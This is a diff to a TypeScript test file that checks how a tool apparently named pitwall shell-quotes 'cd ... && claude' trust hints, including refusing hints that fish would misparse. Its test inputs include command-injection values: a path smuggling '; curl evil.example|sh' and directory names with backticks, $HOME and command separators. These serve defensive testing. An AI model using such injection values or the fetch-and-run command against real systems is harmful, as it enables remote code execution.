@@ -30,6 +30,7 @@ import {
   resumeArgs,
   shellQuote,
   spawnArgs,
+  NO_TRUST_COMMAND,
   SpawnLimiter,
   trustHint,
   type ActionOptions,
@@ -63,6 +64,9 @@ beforeAll(async () => {
   webRoot = join(tmp, 'web');
   await mkdir(join(repo, 'packages', 'worker'), { recursive: true });
   await mkdir(join(root, "it's a dir"), { recursive: true });
+  // W87: one that single quotes carry the same way in every shell, and one they don't.
+  await mkdir(join(root, SPECIAL_DIR), { recursive: true });
+  await mkdir(join(root, 'back\\slash'), { recursive: true });
   await mkdir(outside, { recursive: true });
   await mkdir(webRoot, { recursive: true });
   await writeFile(join(webRoot, 'index.html'), '<!doctype html><title>pitwall</title>');
@@ -92,6 +96,8 @@ const ENDED_MISSING_ID = '88888888-8888-4888-8888-888888888888';
 const ENDED_GONE_ID = 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa';
 const ENDED_ESCAPE_ID = 'bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb';
 const ENDED_QUOTED_ID = 'cccccccc-cccc-4ccc-8ccc-cccccccccccc';
+/** A directory name with a space and characters shells treat specially, but no `'` or `\\` (W87). */
+const SPECIAL_DIR = 'a dir $HOME `id` ;&|';
 /** Ended sessions some W81 tests add to the snapshot. */
 const ENDED_LINK_ID = '12345678-1234-4234-8234-123456789abc';
 const ENDED_BIDI_ID = 'eeeeeeee-eeee-4eee-8eee-eeeeeeeeeeee';
@@ -580,14 +586,26 @@ describe('spawn: running claude --bg', () => {
   });
 
   it('quotes the hint so a shell runs it in exactly that directory', async () => {
-    const dir = join(root, "it's a dir");
+    const dir = join(root, SPECIAL_DIR);
     const started = await start(fakeRunner(exited(1, '', `Workspace not trusted. Run \`claude\` in ${dir} once.`)));
     const res = await spawnAsPage(started, { ...valid(), cwd: dir });
     const { hint } = res.json as { hint: string };
-    expect(hint).toBe(`cd '${dir.replace("'", `'\\''`)}' && claude`);
+    expect(hint).toBe(`cd '${dir}' && claude`);
     // The hint's cd, run by a real shell with pwd in place of claude.
     const { stdout } = await promisify(execFile)('/bin/sh', ['-c', hint.replace(/ && claude$/, ' && pwd')]);
     expect(stdout.trim()).toBe(dir);
+  });
+
+  it("gives no hint for a directory whose path has a ' or \\, which fish reads differently in single quotes, and says why (W87)", async () => {
+    for (const name of ["it's a dir", 'back\\slash']) {
+      const dir = join(root, name);
+      const line = `Workspace not trusted. Run \`claude\` in ${dir} once and accept the trust prompt, then retry.`;
+      const started = await start(fakeRunner(exited(1, '', `${line}\n`)));
+      const res = await spawnAsPage(started, { ...valid(), cwd: dir });
+      expect(res.status, name).toBe(422);
+      expect(res.json, name).toEqual({ ok: false, error: `${line} ${NO_TRUST_COMMAND}` });
+      expect(started.run.calls.map((call) => call.args[0]), name).toEqual(['--bg']);
+    }
   });
 
   it("answers 502 with Claude Code's first error line for any other failure", async () => {
@@ -1002,14 +1020,27 @@ describe('resume (W66)', () => {
     expect(errorOf(res)).toMatch(/started a copy instead/);
   });
 
-  it("answers 422 with Claude Code's message and a hint, quoted, for an untrusted workspace, and never trusts it", async () => {
-    const dir = join(root, "it's a dir");
+  it("answers 422 with Claude Code's message and a hint for an untrusted workspace, and never trusts it", async () => {
+    const dir = join(repo, 'packages', 'worker');
     const message = `Workspace not trusted. Run \`claude\` in ${dir} once and accept the trust prompt, then retry.\n`;
     const started = await start(fakeRunner(exited(1, '', message)));
-    const res = await postAsPage(started, resumePath(ENDED_QUOTED_ID));
+    const res = await postAsPage(started, resumePath(ENDED_ID));
     expect(res.status).toBe(422);
-    expect(res.json).toEqual({ ok: false, error: message.trim(), hint: trustHint(dir) });
+    expect(res.json).toEqual({ ok: false, error: message.trim(), hint: `cd ${dir} && claude` });
     expect(started.run.calls.map((call) => call.args[0])).toEqual(['--resume']);
+  });
+
+  it("answers 422 with no hint for a directory whose path has a ' or \\, saying why after Claude Code's message (W87)", async () => {
+    const backslash = 'dddddddd-dddd-4ddd-8ddd-dddddddddddd';
+    for (const [id, name] of [[ENDED_QUOTED_ID, "it's a dir"], [backslash, 'back\\slash']] as const) {
+      const dir = join(root, name);
+      const line = `Workspace not trusted. Run \`claude\` in ${dir} once and accept the trust prompt, then retry.`;
+      const started = await start(fakeRunner(exited(1, '', `${line}\n`)), {}, fakeIndexer(snapshotWith(ended(backslash, join(root, 'back\\slash')))));
+      const res = await postAsPage(started, resumePath(id));
+      expect(res.status, name).toBe(422);
+      expect(res.json, name).toEqual({ ok: false, error: `${line} ${NO_TRUST_COMMAND}` });
+      expect(started.run.calls.map((call) => call.args[0]), name).toEqual(['--resume']);
+    }
   });
 
   it("answers 502 with Claude Code's first error line, or how it exited, or when it reported no id", async () => {
@@ -1231,11 +1262,22 @@ describe('helpers', () => {
   it('shellQuote leaves plain words alone and single-quotes everything else', () => {
     expect(shellQuote('/Users/example/code/demo-app')).toBe('/Users/example/code/demo-app');
     expect(shellQuote('/tmp/with space')).toBe("'/tmp/with space'");
-    expect(shellQuote("/tmp/it's")).toBe("'/tmp/it'\\''s'");
     expect(shellQuote('/tmp/$HOME/`id`;rm')).toBe("'/tmp/$HOME/`id`;rm'");
+    expect(shellQuote('/tmp/"double" (paren) {brace} *?[x] !bang #hash ~tilde')).toBe(`'/tmp/"double" (paren) {brace} *?[x] !bang #hash ~tilde'`);
     expect(shellQuote('~/code')).toBe("'~/code'");
     expect(shellQuote('')).toBe("''");
     expect(trustHint('/tmp/a b')).toBe("cd '/tmp/a b' && claude");
+  });
+
+  it("shellQuote has no word for a ' or \\, which fish reads differently from POSIX shells in single quotes, nor a control or bidi character (W87)", () => {
+    // POSIX's '\\'' would end fish's word early: `cd '/r/a\\'\\''; curl evil.example|sh; #'` runs curl there.
+    for (const value of ["/tmp/it's", "/r/a\\'; curl evil.example|sh; #", '/tmp/back\\slash', '/tmp/ends\\', "'"]) {
+      expect(shellQuote(value), value).toBeUndefined();
+      expect(trustHint(value), value).toBeUndefined();
+    }
+    for (const value of ['/tmp/new\nline', '/tmp/del\u007f', '/tmp/csi\u009b2J', '/tmp/rlm\u200f', '/tmp/rlo\u202eexe', '/tmp/iso\u2066']) {
+      expect(shellQuote(value), JSON.stringify(value)).toBeUndefined();
+    }
   });
 
   it('firstLine skips blank lines and strips escapes', () => {
